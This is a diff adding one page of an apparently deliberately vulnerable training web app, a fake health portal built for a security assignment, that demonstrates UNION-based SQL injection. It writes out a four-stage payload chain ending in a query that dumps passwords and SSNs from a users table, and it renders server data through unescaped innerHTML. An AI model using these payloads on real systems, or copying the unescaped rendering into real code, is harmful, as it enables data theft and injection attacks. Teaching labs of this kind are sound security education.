@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Patient Medical Records — MedShield Health Portal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="nav-container">
+            <a href="index.html" class="logo">
+                <span class="logo-badge">M+</span>
+                <span>MedShield Health</span>
+            </a>
+            <nav>
+                <ul>
+                    <li><a href="index.html">Overview & Search</a></li>
+                    <li><a href="login.html">Login (Easy SQLi)</a></li>
+                    <li><a href="records.html" class="active">Records (Advanced SQLi)</a></li>
+                    <li><a href="reviews.html">Reviews (Stored XSS)</a></li>
+                    <li><a href="department.html">Departments (DOM XSS)</a></li>
+                    <li><a href="profile.html">Profile (CSRF)</a></li>
+                </ul>
+            </nav>
+            <div class="mode-toggle-box">
+                <span id="nav-mode-badge" class="mode-badge vulnerable">🔴 VULNERABLE MODE</span>
+                <button id="toggle-mode-btn" class="btn-toggle">Switch Mode</button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="card">
+            <h1 class="card-title">📋 Electronic Health Records (SQLi Level 3: Advanced)</h1>
+            <p class="lead">
+                Demonstrates a multi-stage structured <strong>UNION-based SQL Injection attack chain</strong>. In Vulnerable Mode, an attacker can enumerate database schema and exfiltrate user credentials and SSNs directly through this search portal.
+            </p>
+
+            <form id="record-search-form" onsubmit="searchRecords(event)">
+                <div class="form-group">
+                    <label for="record-search">Filter Patient Health Records:</label>
+                    <div style="display: flex; gap: 0.75rem;">
+                        <input type="text" id="record-search" placeholder="e.g. John Doe, Hypertension, or UNION SQLi payload..." required>
+                        <button type="submit" class="btn btn-primary">Query Database</button>
+                    </div>
+                </div>
+            </form>
+
+            <!-- 4-Stage Attack Chain Chips -->
+            <div class="payload-helper">
+                <h4>🎯 4-Stage Advanced SQL Injection Attack Chain:</h4>
+                <div class="payload-chips">
+                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, 2, 3, 4, 5, 6 --">
+                        Stage 1: Determine Column Count (UNION SELECT 1..6)
+                    </span>
+                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, tbl_name, sql, 'SCHEMA', 5, 6 FROM sqlite_master WHERE type='table' --">
+                        Stage 2: Enumerate Tables & Schema (sqlite_master)
+                    </span>
+                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, name, type, 'COLUMN_SPEC', 5, 6 FROM pragma_table_info('users') --">
+                        Stage 3: Enumerate Target Columns (pragma users)
+                    </span>
+                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT id, username, password, email, role, ssn FROM users --">
+                        Stage 4: EXFILTRATE Passwords & SSNs from users
+                    </span>
+                    <span class="chip" data-target="record-search" data-payload="John">
+                        Normal Search: John
+                    </span>
+                </div>
+            </div>
+
+            <!-- SQL Query Inspector -->
+            <div id="query-inspector" style="margin-top: 1.5rem; display: none;">
+                <label>Executed Backend SQL Query:</label>
+                <pre id="query-text" style="background: #020617; padding: 0.85rem; border-radius: 8px; color: #38bdf8; font-size: 0.85rem; overflow-x: auto;"></pre>
+            </div>
+
+            <!-- Records Results Table -->
+            <div id="records-table-container" class="table-responsive" style="margin-top: 1.5rem;">
+                <table>
+                    <thead>
+                        <tr id="records-thead">
+                            <th>Record ID</th>
+                            <th>Patient / Field 2</th>
+                            <th>Doctor / Password / Field 3</th>
+                            <th>Diagnosis / Email / Field 4</th>
+                            <th>Treatment / Role / Field 5</th>
+                            <th>Status / SSN / Field 6</th>
+                        </tr>
+                    </thead>
+                    <tbody id="records-tbody"></tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>MedShield Health Portal — Information Security Practical Assignment 2</p>
+    </footer>
+
+    <script src="app.js"></script>
+    <script>
+        async function searchRecords(e) {
+            if (e) e.preventDefault();
+            const searchVal = document.getElementById('record-search').value;
+            const res = await fetch(`/api/records?search=${encodeURIComponent(searchVal)}`);
+            const data = await res.json();
+
+            const inspector = document.getElementById('query-inspector');
+            const queryText = document.getElementById('query-text');
+
+            if (data.executedQuery) {
+                inspector.style.display = 'block';
+                queryText.textContent = data.executedQuery;
+            } else {
+                inspector.style.display = 'none';
+            }
+
+            const tbody = document.getElementById('records-tbody');
+            tbody.innerHTML = '';
+
+            if (data.records && data.records.length > 0) {
+                data.records.forEach(r => {
+                    const row = document.createElement('tr');
+                    // Highlight dumped sensitive credentials in red if exfiltrated
+                    const isDumpedUser = (r.status && (r.status.includes('-') || r.treatment === 'Chief Medical Officer' || r.treatment === 'Patient'));
+                    if (isDumpedUser) {
+                        row.style.background = 'rgba(239, 68, 68, 0.15)';
+                    }
+                    row.innerHTML = `
+                        <td><strong>${r.id}</strong></td>
+                        <td>${r.patient_name || '-'}</td>
+                        <td><span style="${isDumpedUser ? 'color: #f87171; font-weight: bold;' : ''}">${r.doctor_name || '-'}</span></td>
+                        <td>${r.diagnosis || '-'}</td>
+                        <td>${r.treatment || '-'}</td>
+                        <td><span style="${isDumpedUser ? 'color: #facc15; font-weight: bold;' : ''}">${r.status || '-'}</span></td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } else {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted);">No records found matching query (or blocked by Safe Mode defense).</td></tr>`;
+            }
+        }
+
+        // Initial load
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('record-search').value = 'Hypertension';
+            searchRecords();
+        });
+    </script>
+</body>
+</html>
